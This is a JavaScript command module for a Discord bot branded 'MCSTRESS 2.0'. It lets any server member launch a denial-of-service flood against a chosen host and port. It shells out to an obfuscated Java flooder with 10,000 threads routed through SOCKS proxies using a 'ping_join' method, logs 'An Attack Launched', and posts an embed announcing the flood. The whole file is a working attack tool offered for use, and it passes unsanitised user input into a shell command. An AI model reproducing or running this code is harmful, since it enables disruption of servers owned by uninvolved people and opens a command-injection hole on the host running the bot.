const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar DropBotv9-beta_obf.jar host=${host} port=${port} pfile=socks_proxies.txt threads=10000 method=ping_join version=47 license=123ascqweq11`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **MCSTRESS 2.0** 🔥')
	.setTimestamp()
	.setDescription("**► Method: Ultimate3 💥** \n \n ► Attack started! ✅ \n ► for 120 seconds! 🕒 \n ☆ Flood by MCSTEAM ☆")
	.setFooter('© Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['pingjoin'],
  permLevel: 0
}

exports.help = {
  name: 'ultimate3',
  description: 'Özel',
  usage: 'ultimate3'
}